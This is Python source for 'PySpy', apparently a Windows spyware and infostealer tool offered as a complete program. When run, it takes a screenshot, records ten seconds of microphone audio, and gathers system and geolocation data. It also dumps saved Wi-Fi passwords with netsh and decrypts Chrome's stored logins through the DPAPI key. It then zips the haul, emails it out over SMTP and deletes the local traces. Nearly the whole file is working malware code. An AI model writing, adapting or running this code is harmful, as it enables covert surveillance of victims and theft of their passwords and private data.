try:
    import platform
    import psutil
    import socket
    import pyaudio
    import wave
    import os
    import sys
    import shutil
    import zipfile
    import smtplib
    import requests
    import json
    import re
    import subprocess
    import base64
    import sqlite3
    import win32crypt
    from Cryptodome.Cipher import AES
    from datetime import datetime
    from PIL import ImageGrab
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
except ModuleNotFoundError:
    from subprocess import call
    modules = ["psutil", "pyaudio", "wave", "requests", "Pillow", "pycryptodomex", "pywin32"]
    call("pip install " + ' '.join(modules), shell=True)

class PySpy:
    def __init__(self):
        # Email credentials and output paths
        self.EMAIL_ADDRESS = "username"   # Replace with the actual email address
        self.EMAIL_PASSWORD = "password"  # Replace with the actual email password
        self.output_path = "info"   # Directory to store temporary information
        self.zip_folder_name = "info_" + datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".zip"
        self.output_zip_file = self.zip_folder_name
        self.CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
        self.CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])
        # Create the output path directory if it doesn't exist
        if not os.path.exists(self.output_path):
            os.makedirs(self.output_path)

    def acquire_lock(self, lock_file_path):
        try:
            # Try to create the lock file if it doesn't exist.
            lock_file = open(lock_file_path, 'x')
            return lock_file
        except FileExistsError:
            # The lock file already exists, meaning another instance is running.
            return None

    def get_system_information(self):
        # Get various system information using platform and psutil modules
        # and store them in a dictionary for later use.
        system_info = {
            "Operating System": platform.system(),
            "OS Version": platform.release(),
            "Architecture": platform.machine(),
            "Processor": platform.processor(),
            "Hostname": socket.gethostname(),
            "Total RAM (GB)": round(psutil.virtual_memory().total / (1024.0 ** 3), 2),
            "Available RAM (GB)": round(psutil.virtual_memory().available / (1024.0 ** 3), 2),
            "Used RAM (GB)": round(psutil.virtual_memory().used / (1024.0 ** 3), 2),
            "Total Disk Space (GB)": round(psutil.disk_usage('/').total / (1024.0 ** 3), 2),
            "Used Disk Space (GB)": round(psutil.disk_usage('/').used / (1024.0 ** 3), 2),
            "Free Disk Space (GB)": round(psutil.disk_usage('/').free / (1024.0 ** 3), 2),
            "CPU Usage (%)": psutil.cpu_percent(interval=1),
            "CPU Cores": psutil.cpu_count(logical=False),
            "CPU Threads": psutil.cpu_count(logical=True),
            "Network Information": self.get_network_info(),
        }
        return system_info
    
    def get_geolocation_data(self, ip_address=None):
        url = f"http://ipinfo.io/{ip_address}/json" if ip_address else "http://ipinfo.io/json"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            return data
        else:
            print("Error: Unable to fetch geolocation data.")
            return None
    
    def save_geolocation_data_to_file(self, data, filename):
        with open(filename, "w") as file:
            json.dump(data, file)

    def get_network_info(self):
        # Get network information by iterating through network interfaces and IP addresses.
        network_info = []
        interfaces = psutil.net_if_addrs()
        for interface_name, interface_addresses in interfaces.items():
            for address in interface_addresses:
                if str(address.family) == 'AddressFamily.AF_INET':
                    network_info.append(f"{interface_name}: {address.address}")
        return network_info

    def run_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
            return output.strip()
        except subprocess.CalledProcessError as e:
            return f"Error executing command: {command}\n{e.output.strip()}"

    def start_wlan_service(self):
        return self.run_command("net start wlansvc")

    def stop_wlan_service(self):
        return self.run_command("net stop wlansvc")

    def get_wifi_profiles(self):
        wlan_status = self.run_command("netsh wlan show interfaces")
        if "not running" in wlan_status:
            start_result = self.start_wlan_service()
            if "started successfully" not in start_result:
                return start_result

        wlan_profiles_output = self.run_command("netsh wlan show profiles")
        if "no wireless interface" in wlan_profiles_output:
            return wlan_profiles_output

        wifi_profiles = re.findall(r": (.*)\r", wlan_profiles_output)
        return wifi_profiles

    def get_wifi_profile_password(self, profile_name):
        password_output = self.run_command(f"netsh wlan show profile name=\"{profile_name}\" key=clear")
        return password_output

    def save_profiles_to_file(self, wifi_file, wifi_info):
        with open(wifi_file, "w") as file:
            for profile, password in wifi_info.items():
                file.write(f"Profile: {profile}\n")
                file.write(f"Password Info: \n{password}\n\n")

    def write_to_file(self, system_info, file_path):
        # Write system information to a text file.
        output_path = os.path.join(self.output_path, file_path)
        with open(output_path, 'w') as file:
            for key, value in system_info.items():
                if isinstance(value, list):
                    file.write(f"{key}:\n")
                    for item in value:
                        file.write(f"\t{item}\n")
                else:
                    file.write(f"{key}: {value}\n")

    def take_screenshot(self):
        # Take a screenshot and save it in the output directory.
        screenshot_filename = "screenshot_" + datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".png"
        try:
            screenshot = ImageGrab.grab()
            output_path = os.path.join(self.output_path, screenshot_filename)
            screenshot.save(output_path)
            print(f"Screenshot saved as '{screenshot_filename}'")

        except Exception as e:
            print("An error occurred while taking the screenshot:", e)

    def record_audio(self, filename, duration=10, rate=44100, channels=1, format=pyaudio.paInt16):
        # Record audio for the specified duration and save it as a WAV file.
        # Default values: duration=10 seconds, rate=44100 Hz, channels=1 (Mono), format=16-bit PCM.
        chunk_size = 1024
        audio_format = format
        audio_channels = channels
        audio_rate = rate
        audio = pyaudio.PyAudio()
        stream = audio.open(format=audio_format, channels=audio_channels, rate=audio_rate, input=True, frames_per_buffer=chunk_size)
        print("Recording...")
        frames = []
        for i in range(0, int(audio_rate / chunk_size * duration)):
            data = stream.read(chunk_size)
            frames.append(data)
        print("Finished recording.")
        stream.stop_stream()
        stream.close()
        audio.terminate()
        output_path = os.path.join(self.output_path, filename)

        wave_file = wave.open(output_path, 'wb')
        wave_file.setnchannels(audio_channels)
        wave_file.setsampwidth(audio.get_sample_size(audio_format))
        wave_file.setframerate(audio_rate)
        wave_file.writeframes(b''.join(frames))
        wave_file.close()
    
    def get_secret_key(self):
        try:
            # Get secret key from Chrome local state
            with open(self.CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("[ERROR] Chrome secret key cannot be found:", e)
            return None

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, ciphertext, secret_key):
        try:
            # Initialization vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # Build the cipher to decrypt the ciphertext
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password).decode()
            return decrypted_pass
        except Exception as e:
            print("[ERROR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    def get_db_connection(self, chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("[ERROR] Chrome database cannot be found:", e)
            return None
        
    def get_chrome_passwords(self, password_file):
        try:
            # Create a text file to store passwords
            with open(password_file, mode='w', encoding='utf-8') as decrypt_password_file:

                # Get secret key
                secret_key = self.get_secret_key()

                # Search user profile or default folder (this is where the encrypted login password is stored)
                folders = [element for element in os.listdir(self.CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]

                for folder in folders:
                    # Get ciphertext from sqlite database
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (self.CHROME_PATH, folder))
                    conn = self.get_db_connection(chrome_path_login_db)

                    if secret_key and conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                        for index, login in enumerate(cursor.fetchall()):
                            url, username, ciphertext = login

                            if url and username and ciphertext:
                                # Use AES algorithm to decrypt the password
                                decrypted_password = self.decrypt_password(ciphertext, secret_key)
                                decrypted_data = f"No. {index + 1}:\nURL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'_' * 70}\n"
                                decrypt_password_file.write(decrypted_data)

                        # Close database connection
                        cursor.close()
                        conn.close()

                        # Delete the temporary login database
                        os.remove("Loginvault.db")

        except Exception as e:
            print("[ERROR]", e)

    def zip_folder(self, folder_path, output_path):
        # Zip the specified folder and its contents.
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    relative_path = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, relative_path)

    def send_mail(self, sender_email, sender_password):
        # Compose and send an email with the zipped folder as an attachment.
        receiver_email = "receiver_email@example.com"   # Replace with the recipient's email address.
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = "PySpy logs"
        body = "This email contains a zip folder as an attachment. Date: " + datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "\nPySpy"
        msg.attach(MIMEText(body, 'plain'))
        with open(self.output_zip_file, 'rb') as zip_file:
            part = MIMEBase('application', 'zip')
            part.set_payload(zip_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.output_zip_file)}"')
            msg.attach(part)
        try:
            server = smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) # Replace with the appropriate SMTP server details.
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
            server.quit()
            print("Email sent successfully!")
        except Exception as e:
            print(f"Error: {e}")
    
    def delete_file_or_folder(self, path):
        # Delete the specified file or folder permanently.
        try:
            if os.path.exists(path):
                if os.path.isfile(path):
                    os.remove(path)
                    print(f"File '{path}' deleted permanently.")
                elif os.path.isdir(path):
                    shutil.rmtree(path)
                    print(f"Folder '{path}' deleted permanently.")
            else:
                print(f"Path '{path}' does not exist.")
        except Exception as e:
            print(f"Error while deleting: {e}")

    def run(self):
        # Define the path to the lock file.
        LOCK_FILE_PATH = "pyspy_lock"

        # Try to acquire the lock.
        lock_file = self.acquire_lock(LOCK_FILE_PATH)
        if lock_file is None:
            print("Another instance of the program is already running.")
            sys.exit(1)

        try:
            # The lock is acquired
            self.take_screenshot()  # Take a screenshot and save it.

            current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            file_name = f"system_info_{current_datetime}.txt"

            system_info = self.get_system_information()
            self.write_to_file(system_info, file_name)  # Write system information to a text file.

            geo_file = self.output_path + "/" + f"geolocation_data_{current_datetime}.txt"
            geolocation_data = self.get_geolocation_data()
            if geolocation_data:
                self.save_geolocation_data_to_file(geolocation_data, geo_file)
                print("Geolocation data saved to geolocation_data.txt.")

            print(f"System information has been written to '{geo_file}'")

            wifi_profiles = self.get_wifi_profiles()
            if isinstance(wifi_profiles, str):
                # Handle error condition
                print(wifi_profiles)
            else:
                wifi_info = {}
                for profile in wifi_profiles:
                    password_info = self.get_wifi_profile_password(profile)
                    wifi_info[profile] = password_info
                wifi_file = self.output_path + "/" + f"wifi_profiles_{current_datetime}.txt"
                self.save_profiles_to_file(wifi_file, wifi_info)
                print("Wi-Fi profiles and passwords saved to wifi_profiles.txt")

            output_filename = "recorded_audio_" + current_datetime + ".wav"
            self.record_audio(output_filename, duration=10) # Record audio for 10 seconds.

            password_file = self.output_path + "/" + "decrypted_passwords_" + current_datetime + ".txt"
            self.get_chrome_passwords(password_file)

            folder_to_zip = self.output_path
            output_zip_file = self.output_zip_file

            self.zip_folder(folder_to_zip, output_zip_file) # Zip the output folder.
            print("Folder zipped successfully.")

            self.send_mail(self.EMAIL_ADDRESS, self.EMAIL_PASSWORD) # Send email with the zip file attached.

            self.delete_file_or_folder(output_zip_file) # Delete the temporary zip file.
            self.delete_file_or_folder(folder_to_zip)   # Delete the temporary output folder.

        finally:
            # Release the lock and clean up.
            lock_file.close()
            os.remove(LOCK_FILE_PATH)


if __name__ == "__main__":
    spy = PySpy()
    spy.run()   # Run the PySpy program.
